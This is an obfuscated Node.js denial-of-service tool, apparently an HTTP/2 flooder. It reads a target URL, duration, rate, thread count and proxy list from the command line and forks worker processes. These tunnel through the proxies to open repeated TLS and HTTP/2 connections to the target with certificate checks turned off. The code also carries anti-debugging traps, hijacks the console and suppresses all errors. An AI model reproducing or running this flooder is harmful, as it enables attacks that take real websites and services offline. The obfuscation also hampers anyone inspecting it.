(function (_0x3d45e4, _0x154977) {
  const _0x588378 = _0x3d45e4();
  while (true) {
    try {
      const _0xa95176 = parseInt(_0x9361(836, 0x13a)) / 1 * (-parseInt(_0x9361(695, 0x157)) / 2) + -parseInt(_0x9361(241, 0x86)) / 3 + -parseInt(_0x9361(689, 0x2ab)) / 4 + -parseInt(_0x9361(833, 0x35d)) / 5 * (parseInt(_0x9361(670, 0x2db)) / 6) + parseInt(_0x9361(397, 0x249)) / 7 * (parseInt(_0x9361(360, -0xa9)) / 8) + -parseInt(_0x9361(213, 0x2b2)) / 9 + parseInt(_0x9361(656, 0x17b)) / 10 * (parseInt(_0x9361(820, 0x2ba)) / 11);
      if (_0xa95176 === _0x154977) {
        break;
      } else {
        _0x588378.push(_0x588378.shift());
      }
    } catch (_0x11efb6) {
      _0x588378.push(_0x588378.shift());
    }
  }
})(_0x2708, 683619);
const net = require("net");
function _0x92ef1(_0x1f57b0, _0x28e727, _0x18e6db, _0x85b320, _0x3770ea) {
  return _0x9361(_0x28e727 - 0x243, _0x1f57b0);
}
const http2 = require("http2");
function _0x5069df(_0x1d72da, _0x55bb7f, _0x929922, _0x3cba58, _0x771a1) {
  return _0x9361(_0x929922 + 0x17e, _0x3cba58);
}
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
function _0x55eea7(_0x57df4e, _0xe59036, _0xbadaa, _0x3f8f24, _0x48c655) {
  return _0x9361(_0x48c655 - 0x188, _0x57df4e);
}
const fs = require('fs');
process.on("uncaughtException", function (_0x300d37) {});
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
const headers = {};
function readLines(_0x16e4d9) {
  const _0x43a706 = function () {
    let _0x29559b = true;
    return function (_0x2349b2, _0x40ea9a) {
      const _0x183dd1 = _0x29559b ? function () {
        if (_0x40ea9a) {
          const _0x261e3b = _0x40ea9a.apply(_0x2349b2, arguments);
          _0x40ea9a = null;
          return _0x261e3b;
        }
      } : function () {};
      _0x29559b = false;
      return _0x183dd1;
    };
  }();
  const _0xd9fdc4 = _0x43a706(this, function () {
    return _0xd9fdc4.toString().search("(((.+)+)+)+$").toString().constructor(_0xd9fdc4).search("(((.+)+)+)+$");
  });
  _0xd9fdc4();
  const _0xb5f56b = function () {
    let _0x326b6f = true;
    return function (_0xdbfe99, _0x31ea34) {
      const _0xa0ea5e = _0x326b6f ? function () {
        if (_0x31ea34) {
          const _0x519235 = _0x31ea34.apply(_0xdbfe99, arguments);
          _0x31ea34 = null;
          return _0x519235;
        }
      } : function () {};
      _0x326b6f = false;
      return _0xa0ea5e;
    };
  }();
  (function () {
    _0xb5f56b(this, function () {
      const _0x3f2218 = new RegExp("function *\\( *\\)");
      const _0x5d656d = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", 'i');
      const _0x32d64c = _0x122840("init");
      if (!_0x3f2218.test(_0x32d64c + "chain") || !_0x5d656d.test(_0x32d64c + "input")) {
        _0x32d64c('0');
      } else {
        _0x122840();
      }
    })();
  })();
  const _0x4e67ea = function () {
    let _0x54cf42 = true;
    return function (_0x3349b3, _0x2048f3) {
      const _0x1a3099 = _0x54cf42 ? function () {
        if (_0x2048f3) {
          const _0x2375e3 = _0x2048f3.apply(_0x3349b3, arguments);
          _0x2048f3 = null;
          return _0x2375e3;
        }
      } : function () {};
      _0x54cf42 = false;
      return _0x1a3099;
    };
  }();
  const _0x4e483e = _0x4e67ea(this, function () {
    const _0x4ed586 = function () {
      let _0x4166bf;
      try {
        _0x4166bf = Function("return (function() {}.constructor(\"return this\")( ));")();
      } catch (_0xdbc513) {
        _0x4166bf = window;
      }
      return _0x4166bf;
    };
    const _0x313e84 = _0x4ed586();
    const _0x3f87ab = _0x313e84.console = _0x313e84.console || {};
    const _0x3e6e03 = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let _0x3ebd24 = 0; _0x3ebd24 < _0x3e6e03.length; _0x3ebd24++) {
      const _0x173309 = _0x4e67ea.constructor.prototype.bind(_0x4e67ea);
      const _0x62e79e = _0x3e6e03[_0x3ebd24];
      const _0xff3a7e = _0x3f87ab[_0x62e79e] || _0x173309;
      _0x173309.__proto__ = _0x4e67ea.bind(_0x4e67ea);
      _0x173309.toString = _0xff3a7e.toString.bind(_0xff3a7e);
      _0x3f87ab[_0x62e79e] = _0x173309;
    }
  });
  _0x4e483e();
  return fs.readFileSync(_0x16e4d9, "utf-8").toString().split(/\r?\n/);
}
function _0x230dbc(_0x25187a, _0x347a67, _0x2fd47a, _0xe5c3b8, _0x37f3f9) {
  return _0x9361(_0x25187a - 0x225, _0x37f3f9);
}
function randomIntn(_0xf9bc5, _0x38d501) {
  const _0x1482ba = {
    PkvXC: function (_0x258825, _0xa0a000) {
      return _0x258825 + _0xa0a000;
    }
  };
  _0x1482ba.zgyrq = function (_0x508b5a, _0x28c86d) {
    return _0x508b5a * _0x28c86d;
  };
  _0x1482ba.QFHfZ = function (_0x5b07b1, _0x513563) {
    return _0x5b07b1 - _0x513563;
  };
  return Math.floor(_0x1482ba.zgyrq(Math.random(), _0x1482ba.QFHfZ(_0x38d501, _0xf9bc5)) + _0xf9bc5);
}
(function () {
  const _0x1af0cf = function () {
    let _0x80acef;
    try {
      _0x80acef = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (_0xdfa449) {
      _0x80acef = window;
    }
    return _0x80acef;
  };
  const _0x242af2 = _0x1af0cf();
  _0x242af2.setInterval(_0x122840, 4000);
})();
function randomElement(_0x289054) {
  return _0x289054[randomIntn(0, _0x289054.length)];
}
function _0x1a5fca(_0x548140, _0x8a8e34, _0xb7dfb3, _0x2157d1, _0x4abc53) {
  return _0x9361(_0x8a8e34 + 0x5, _0xb7dfb3);
}
const _0x8f8d76 = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6]
};
var proxies = readLines(_0x8f8d76.proxyFile);
const parsedTarget = url.parse(_0x8f8d76.target);
if (cluster.isMaster) {
  for (let counter = 1; counter <= _0x8f8d76.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x234de, _0x451859) {
    const _0x6a2760 = "CONNECT " + _0x234de.address + ":443 HTTP/1.1\r\nHost: " + _0x234de.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x4be879 = new Buffer.from(_0x6a2760);
    const _0x8b8412 = {
      "host": _0x234de.host,
      "port": _0x234de.port
    };
    const _0x20d6f0 = net.connect(_0x8b8412);
    const _0x365700 = randomIntn(0, 500);
    setTimeout(() => {
      _0x20d6f0.write(_0x4be879);
    }, _0x365700);
    _0x20d6f0.setTimeout(_0x234de.timeout * 10000);
    _0x20d6f0.setKeepAlive(true, 100000);
    _0x20d6f0.on("connect", () => {});
    _0x20d6f0.on("data", _0x3a8126 => {
      const _0x4c0558 = _0x3a8126.toString("utf-8");
      const _0x2f729c = _0x4c0558.includes("HTTP/1.1 200");
      if (_0x2f729c === false) {
        _0x20d6f0.destroy();
        return _0x451859(undefined, "error: invalid response from proxy server");
      }
      return _0x451859(_0x20d6f0, undefined);
    });
    _0x20d6f0.on("timeout", () => {
      _0x20d6f0.destroy();
      return _0x451859(undefined, "error: timeout exceeded");
    });
    _0x20d6f0.on("error", _0x6f94a5 => {
      _0x20d6f0.destroy();
      return _0x451859(undefined, "error: " + _0x6f94a5);
    });
  }
}
const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers.accept = '/';
headers["accept-language"] = "en-US,en;q=0.9";
headers["accept-encoding"] = "gzip, deflate";
headers["cache-control"] = "no-cache";
headers["upgrade-insecure-requests"] = '1';
headers["x-requested-with"] = "XMLHttpRequest";
headers["user-agent"] = ["Chrome", "Firefox", "Safari", "Opera"][randomIntn(0, ["Chrome", "Firefox", "Safari", "Opera"].length)];
function runFlooder() {
  const _0x486b89 = proxies[randomIntn(0, proxies.length)];
  const _0x2d5a9c = _0x486b89.split(':');
  const _0x2740c6 = {
    'host': _0x2d5a9c[0],
    'port': ~~_0x2d5a9c[1],
    'address': parsedTarget.host + ":443",
    'timeout': 0xf
  };
  Socker.HTTP(_0x2740c6, (_0x4596ec, _0x502cd3) => {
    if (_0x502cd3) {
      return;
    }
    _0x4596ec.setKeepAlive(true, 600000);
    const _0x12acab = {
      ALPNProtocols: ['h2'],
      rejectUnauthorized: false,
      servername: url.hostname,
      socket: _0x4596ec,
      secure: true,
      servername: parsedTarget.host,
      cipherSuites: ["TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256"],
      fingerprint: "SHA-256:RqiHyxRAQSbDM..."
    };
    const _0x4c174a = tls.connect(443, parsedTarget.host, _0x12acab);
    _0x4c174a.setKeepAlive(true, 600000);
    const _0x4d7ddb = {
      headerTableSize: 0x10000,
      maxConcurrentStreams: 0x3e8,
      initialWindowSize: 0x600000,
      maxHeaderListSize: 0x40000,
      enablePush: false
    };
    const _0x4fbb91 = {
      protocol: "https:",
      settings: _0x4d7ddb,
      maxSessionMemory: 0xd05,
      maxDeflateDynamicTableSize: 0xffffffff,
      createConnection: () => _0x4c174a,
      socket: _0x4596ec
    };
    const _0x120a6e = http2.connect(parsedTarget.href, _0x4fbb91);
    const _0x5a1cef = {
      headerTableSize: 0x10000,
      maxConcurrentStreams: 0x3e8,
      initialWindowSize: 0x600000,
      maxHeaderListSize: 0x40000,
      enablePush: false
    };
    _0x120a6e.settings(_0x5a1cef);
    _0x120a6e.on("connect", () => {});
    _0x120a6e.on("close", () => {
      _0x120a6e.destroy();
      _0x4596ec.destroy();
      return;
    });
    _0x120a6e.on("error", _0xbe9d10 => {
      _0x120a6e.destroy();
      _0x4596ec.destroy();
      return;
    });
  });
}
const KillScript = () => process.exit(1);
function _0x2708() {
  const _0x5f01f9 = ['ZcMGO', 'x-req', 'oIpCm', 'VOusl', 'upaqD', 'zed', 'lhOQg', 'iHyxR', 'JWMJd', 'NZTAZ', 'kFZcP', 'WmyoT', 'floor', 'event', 'rotoc', ':443', 'oVeHB', 'pKJue', 'KBDht', 'hostn', 'Hufip', 'ISuSU', ')+)+)', 'warn', 'ybGat', 'MYQlO', 'xUIcj', '352rmWYsV', 'vZYSj', 'clust', 'NVXot', 'kwDNe', "\\+\\+ ", 'error', '256', 'rol', 'SKUKu', 'bZUGG', 'iSriE', 'KqAGb', '10315RRQrNs', 'WBnPy', 'BJway', '1EhYoFZ', 'PNAvn', 'table', 'LtDcM', 'timeo', 'SKrkt', ": tim", 'iuvNF', 'XrtuI', 'tUnau', 'ciphe', 'FHMoN', 'utf-8', 'cHrqp', 'en-US', 'split', 'FUuZe', 'ZETpY', 'CqZMT', 'epAli', 'lMroc', 'Kltrn', 'TLS_C', 'FORAB', "n() ", 'Rate', 'hKJOy', 'leSiz', 'evGdc', 'quqPk', 'FmSIL', 'setti', 'searc', 'yjYXK', 'mieGS', 'tWQxc', 'yIFlY', 'HpRfW', 'lengt', 'TcKBe', 'Ejcuj', 'uests', 'Oisdh', 'PnFUy', 'ners', 'inclu', 'LY130', 'UbmXY', 'serve', 'aCUPI', '56:Rq', 'AQSbD', 'ing', 'RVusz', 'ame', 'fRyjg', 'sWOke', 'enabl', 'maxCo', 'entSt', '.14.1', 'eFOtq', 'ePush', 'tion', 'che', 'dtqFv', 'NvaHp', 'igRnh', 'HzCBw', 'ZqKVN', 'srHiv', 'WGeLs', 'data', '6710490iqIuXS', 'icTab', '$]*)', 'Qydvo', 'FXYUF', 'flate', 'luiHS', 'excep', 'MdQCl', 'gjdOY', 'Chrom', 'imExz', 'riwWn', 'DvcmJ', 'defau', 'eAnny', 'obEIV', 'bdUXq', 'gaVGb', 'trace', 'https', 'CExtD', " (tru", 'xTbJS', 'alWin', 'gWPXG', 'NOqra', 'lfkUJ', '1239372Eccrxq', 'rKFMi', 'MisBU', 'eners', 'QFHfZ', 'xjJBI', 'close', 'zYzxv', 'eCGUp', 'jTTEZ', 'rsAxF', 't-lan', 'msYFD', 'RkujM', 'type', 'jQYbW', 'socke', 'UlyWn', 'ZgURV', 'OjYgx', '(((.+', 'VNFWX', 'esXVD', 'WPYok', 'gFsDD', 'QlEMR', 'bTaue', 'vpjOc', "alid ", 'xCbjs', 'HTTP/', 'KldyQ', 'thori', 'BAGxA', 'wjGKr', 'retur', 'yMmVo', ':path', 'XqrlF', 'YErvA', 'ngs', 'fork', "rom p", 'HMlwa', 'fKzeV', 'parse', 'GyIwb', 'Aexgz', 'nPnVg', 'PMkzn', 'kJYaf', 'ghtEx', 'DDZss', 'lqwGs', 'caGJj', 'BdZLM', 'CONNE', 'KBFgO', 'myAxH', 'UWyOt', 'ded', "1.1 2", 'input', '{}.co', 'vtcCK', 'PhMFP', "\nConn", 'iNCwk', 'KSCpP', 'gZPOq', 'EipUK', 'isMas', 'Acmhv', 'nGTxb', 'actio', 'TMlip', 'dvUgL', 'Emitt', 'WKbIg', 'GBkoU', 'strin', 'UJptA', 'NFbmT', 'ynppW', 'OlkGg', 'RhByc', 'vLJRL', 'QTNMs', 'bwFUj', 'yVDLl', 'DsgUJ', 'UPckV', 'itXUV', 'EdPeO', ',en;q', 'QbFbi', 'fjlGE', 'XMLHt', 'lPngI', 'no-ca', 'funct', 'EqMNi', 'ijnpj', 'CHvVx', 'mUbCX', 'lRrIk', 'end', 'vVgZl', 'xList', 'RaufC', 'http2', 'ter', 'ZwZuj', 'SHA-2', 'wwrkb', 'crypt', 'YJbpH', 'from', 'rWRSh', '8MObVPQ', 'vQMJp', 'hVvgd', 'ueste', ':meth', " defl", 'eDiXL', 'zA-Z_', 'GFFTV', 'rname', 'UaKuq', 'SVgpZ', 'conne', 'JrUen', 'rDypf', 'col', 'roJbN', 'maxHe', 'rUjuQ', 'mJRax', 'ffOIZ', 'uest', 'CMVMO', 'vpsej', 'AVMZK', 'otmwe', 'Host:', 'WdsIo', 'RGrYV', 'KrVmu', 'bind', 'kRZXb', 'PCKJJ', 'argv', 'setMa', 'wdJtb', 'LtNhw', '9340618JrWqYP', 'qQHAK', 'vZhaj', 'agent', 'gumnc', 'ulZBO', 'oqlxb', 'eCVxn', 'd-wit', 'fdfZS', ":443 ", 'Bnnsi', "CT ", 'QDGQD', 'creat', 'SyOgT', "nse f", 'vOzSp', 'e-req', 'cglPi', 'HkyGj', 'reque', 'Wfowx', 'oAlKk', 'XFvmV', 'XqeYf', 'nlaTf', 'TLS_A', 'MUaGl', 'exit', 'SeQOK', 'EfUyh', 'issiu', 'hrKMg', 'ZRXsf', 'url', 'lQzfx', 'gzip,', 'RGMxM', 'de-in', 'dGyVo', 'targe', "rn th", '20_PO', 'info', 'jSHxC', 'uncau', 'dowSi', 'qTTGO', 'OWVmE', 'XnpVm', 'QnPDy', 'yYbnF', 'jDUel', "eout ", 'YVRgx', 'NGoRX', 'oDpGS', 'ttRzK', 'cpFdj', 'XbnlO', 'hWSWw', 'ileSy', 'kSdgd', 'uDJDQ', 'OJSjk', 'BJfsG', 'jVmjD', 'rICmh', 'tasoi', 'GEpPs', 'conso', 'ErgGW', 'tBArH', 'LkRRY', 'addre', 'srWbQ', '_SHA3', 'tgosI', "roxy ", 'KKtXZ', 'xzMkG', 'trBLi', 'zgyrq', 'test', 'log', 'finge', 'hxIpe', 'aderL', 'DBoWj', 'gmvMb', 'Tubno', 'wZCVx', 'call', 'NhsIC', 'wRmMk', 'IaQRs', 'Safar', 'eMfAG', 'VQFms', 'guage', 'apply', 'kfnox', 'IEaqD', 'lwcjj', 'zzvVV', 'POxfc', 'nctio', 'uKXNG', 'oRByk', 'ddSuB', 'IOEWv', 'bbVgG', 'ifVlr', 'eConn', 'kVzdH', 'wkodX', 'secur', 'ES_25', 'GrKhe', 'gger', 'initi', 'reams', 'GET', 't-enc', 'M...', 'GXIxR', "1.1\r\n", 'JOYXI', 'cache', 'YIOQR', 'gpztJ', 'NtNWV', 'bDRzM', 'iJJlN', 'HTTP', 'EckAP', 'IpMjb', 'jwOSv', 'sfTLl', 'ADbjA', 'ExQBb', 'AYFea', '=0.9', 'to__', 'eRvZB', 'NBraj', 'emCwL', ": inv", 'setIn', 'hbapu', "n (fu", 'toStr', 'rando', 'path', 'IIFgF', 'rTabl', 'STQXc', 'lagYe', 'rSuit', 'proto', 'heade', 'yXAzd', 'ubnXT', 'maxSe', 'XRPQf', 'iOiRR', 'SakSk', 'ZMhAk', 'ols', 'Liste', 'HACHA', 'time', 'lpLip', 'ARQSz', 'UgOYr', '6_GCM', 'vYQwA', 'ksogW', 'Z_$][', 'bFjtI', 'net', 'SUNWC', 'aMTCi', 'rejec', 'Objec', 'tls', 'zbAQz', 'HsBGC', 'svNej', 'ZkEws', 'SHmbp', 'mOoPo', "\"retu", 'respo', 'gAxTC', 'mWHQi', 'oLcPn', 'Tcket', 'RZVWi', 'ate', 'TTHOA', 'ISdgi', 'IBVjB', 'uTdtn', 'mzzom', 'UizIO', 'readF', 'Event', 'NXNlr', 'JDSeD', 'oSHfO', 'count', 'wnryc', 'ALPNP', 'const', 'hKISS', 'IcDhc', 'vRErv', 'Yebpt', "ion *", 'dgsej', 'terva', 'ep-Al', 'DPmnb', 'WHuAi', 'mFtpE', 'gRVUH', 'ltMax', 'bLKAH', 'setKe', 'des', 'init', 'qkJPD', 'UYnQJ', '-cont', 'gIHOh', 'href', 'File', 'kadkV', "\\( *\\", 'nPpZE', 'meout', 'eSize', 'hPMLf', 'debu', 'taCxa', 'witqv', 'CHiRx', 'IXOXl', 'FtiJL', 'maxDe', 'threa', 'RRvem', 'ctor(', 'WlKcY', 'TNrjN', "e) {}", 'Dynam', '1015690YnuaWl', 'PCQBE', 'Memor', 'IfldZ', 'wdAPY', 'fYgZb', 'VUHpF', 'tHDAP', 'pvILU', 'axNEY', '0-9a-', 'MfqtN', 'tRNER', 'xpkpG', '1182crYrcY', 'WaNhB', 'eoQUD', 'kwevh', 'pozio', 'write', 'Tetnl', 'user-', 'QHAzk', 'oding', 'sMQmp', 'pdQTm', 'ructo', 'ssion', 'COCPG', 'Firef', 'DKcHX', 'dqbbK', 'UaAKU', '4628836fjFvVf', 'diQaW', 'nstru', 'cepti', 'whiIP', '*(?:[', '2357218SarSgA', 'nse', 'VxJDt', 'chain', 'VHVho', 'EChTw', 'ijrSe', 'hESFK', 'WcpQc', 'ncurr', 'state', 'eApKK', 'bcfKp', 'upgra', 'dVwQf', 'rprin', 'VSyla', 'zJsVx', 'host', 'while', 'ectio', ':sche', 'mMrud', 'PWLhl', ":443\r", 'kwOdW', 'NrbOV', 'ZXdho', '5_SHA', 'uPIvr', 'QolWM', 'Opera', 'lWjtZ', 'qYudi', "ive\r\n", 'istSi', 'pBPcK', 'NaxZz', 'LjHLa', 'KjiJN', 'TUjOH', 'NMmIn', 'UZFLi', 'YNcjN', 'pyuwm', 'CaMRU', 'port', '__pro', 'sMowN', 'BDvFC', 'rxjPD', "is\")(", 'qFNzF', 'BqmFV', 'CeTfM', 'QqrzA', 'dSzSi', 'excee', 'OWZTW', 'mguxD', 'jKdCA', 'criji', 'Oaekj', 'nmkWp', 'tpReq', 'hSzci', 'setTi', 'HXdMB', 'aJouz', 'ijLGz', 'accep', 'qfTKC', 'xaGhL', 'efCZI', 'RYaQl', 'proxy', 'terZI', 'jvxjj', "n: Ke", 'nHUrw', 'iVVmz', 'UCbkq', 'dfWQh', 'EMDbK', 'destr', 'JMrFC', 'PkvXC', 'DOuqH', 'a-zA-', 'FJWaT', 'iBTAt', 'mka/3', 'FudIW', 'OEvCr', 'PajMb', 'ZfHnj', 'MpxJh', 'buJze'];
  _0x2708 = function () {
    return _0x5f01f9;
  };
  return _0x2708();
}
function _0x9361(_0x5109d1, _0x5a88a0) {
  const _0x122840 = _0x2708();
  _0x9361 = function (_0x10491c, _0x262959) {
    _0x10491c = _0x10491c - 199;
    let _0x5b5b97 = _0x122840[_0x10491c];
    return _0x5b5b97;
  };
  return _0x9361(_0x5109d1, _0x5a88a0);
}
setTimeout(KillScript, _0x8f8d76.time * 1000);
function _0x122840(_0xce45e2) {
  function _0x187a18(_0x415155) {
    if (typeof _0x415155 === "string") {
      return function (_0x3e0cad) {}.constructor("while (true) {}").apply("counter");
    } else {
      if (('' + _0x415155 / _0x415155).length !== 1 || _0x415155 % 20 === 0) {
        (function () {
          return true;
        }).constructor("debugger").call("action");
      } else {
        (function () {
          return false;
        }).constructor("debugger").apply("stateObject");
      }
    }
    _0x187a18(++_0x415155);
  }
  try {
    if (_0xce45e2) {
      return _0x187a18;
    } else {
      _0x187a18(0);
    }
  } catch (_0x5e02db) {}
}